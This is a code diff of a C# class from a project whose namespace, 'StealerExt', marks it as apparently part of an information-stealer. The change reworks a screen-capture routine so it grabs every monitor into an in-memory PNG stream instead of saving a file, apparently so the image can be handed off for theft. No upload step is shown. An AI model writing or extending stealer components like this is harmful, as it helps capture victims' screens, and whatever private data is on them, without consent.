@@ -1,14 +1,14 @@
 ﻿using System.Drawing;
 using System.Drawing.Imaging;
+using System.IO;
 using System.Linq;
 using System.Windows.Forms;
 
 namespace StealerExt
 {
-    public class Capture
+    internal class CurrentScreen
     {
-        #region Get ScreenSize & Capture
-        public static void CaptureScreen(string file)
+        public static MemoryStream GetScreenshot()
         {
             int screenCount = Screen.AllScreens.Length;
             int screenTop = SystemInformation.VirtualScreen.Top;
@@ -20,15 +20,12 @@ namespace StealerExt
                 screenWidth *= screenCount;
             else
                 screenHeight *= screenCount;
-            using (Bitmap bmp = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppPArgb))
-            {
-                using (Graphics g = Graphics.FromImage(bmp))
-                {
-                    g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
-                }
-                bmp.Save(file, ImageFormat.Png);
-            }
+            MemoryStream fileStream = new MemoryStream();
+            Bitmap bitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppArgb);
+            Graphics graphics = Graphics.FromImage(bitmap);
+            graphics.CopyFromScreen(screenLeft, screenTop, 0, 0, bitmap.Size);
+            bitmap.Save(fileStream, ImageFormat.Png);
+            return fileStream;
         }
-        #endregion
     }
 }
